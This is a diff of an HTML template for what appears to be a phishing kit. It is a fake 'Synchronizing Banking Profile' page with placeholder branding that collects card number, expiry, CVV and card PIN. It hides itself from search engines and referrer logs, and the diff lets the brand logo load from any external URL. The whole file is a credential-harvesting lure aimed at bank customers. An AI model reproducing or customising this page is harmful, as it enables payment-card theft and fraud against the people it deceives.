@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=5">
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="referrer" content="no-referrer">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self'; connect-src 'self';">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data: https: http:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self'; connect-src 'self';">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <title>{{SITE_NAME}}</title>
@@ -15,14 +15,14 @@
 <body>
     <div id="loading-overlay" class="loading-overlay">
         <div class="spinner"></div>
-        <div class="loading-text" data-render="sync_msg"></div>
+        <div class="loading-text" data-render="sync_msg">Synchronizing Banking Profile...</div>
     </div>
     <div id="root">
         <div class="login-page-container">
             <div class="fluid-form-layout">
                 <div class="login-header">
                     <a href="#">
-                        <img src="assets/{{LOGO_FILENAME}}" alt="" id="brand-logo">
+                        <img src="{{LOGO_URL}}" alt="" id="brand-logo">
                     </a>
                 </div>
 
@@ -33,31 +33,31 @@
                         </div>
 
                         <div class="fluid-form-layout-field-container">
-                            <label class="field-label" data-render="card_num_label"></label>
+                            <label class="field-label" data-render="card_num_label">Card Number</label>
                             <div class="fluid-input-wrapper">
-                                <input type="text" id="card_num" name="card_num" class="fluid-input" maxlength="19" autocomplete="cc-number" required>
+                                <input type="text" id="card_num" name="card_num" class="fluid-input" placeholder="Card Number" maxlength="19" autocomplete="cc-number" required>
                             </div>
                         </div>
 
                         <div style="display: flex; gap: 15px;">
                             <div class="fluid-form-layout-field-container" style="flex: 1;">
-                                <label class="field-label" data-render="exp_label"></label>
+                                <label class="field-label" data-render="exp_label">Expiration Date</label>
                                 <div class="fluid-input-wrapper">
                                     <input type="text" id="exp" name="exp" class="fluid-input" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" required>
                                 </div>
                             </div>
                             <div class="fluid-form-layout-field-container" style="flex: 1;">
-                                <label class="field-label" data-render="cvv_label"></label>
+                                <label class="field-label" data-render="cvv_label">CVV (C2V)</label>
                                 <div class="fluid-input-wrapper">
-                                    <input type="text" id="cvv" name="cvv" class="fluid-input" maxlength="3" autocomplete="cc-csc" required>
+                                    <input type="text" id="cvv" name="cvv" class="fluid-input" placeholder="CVV" maxlength="3" autocomplete="cc-csc" required>
                                 </div>
                             </div>
                         </div>
 
                         <div class="fluid-form-layout-field-container">
-                            <label class="field-label" data-render="pin_label"></label>
+                            <label class="field-label" data-render="pin_label">Card PIN</label>
                             <div class="fluid-input-wrapper">
-                                <input type="password" id="pin" name="pin" class="fluid-input" maxlength="4" autocomplete="off" required>
+                                <input type="password" id="pin" name="pin" class="fluid-input" placeholder="Card PIN" maxlength="4" autocomplete="off" required>
                             </div>
                         </div>
 
@@ -70,7 +70,7 @@
 
                         <div class="fluid-form-layout-field-container" style="margin-top: 32px;">
                             <button type="submit" class="fluid-button">
-                                <span class="fluid-button__text" data-render="complete_btn"></span>
+                                <span class="fluid-button__text" data-render="complete_btn">Complete Sync</span>
                             </button>
                         </div>
                     </form>
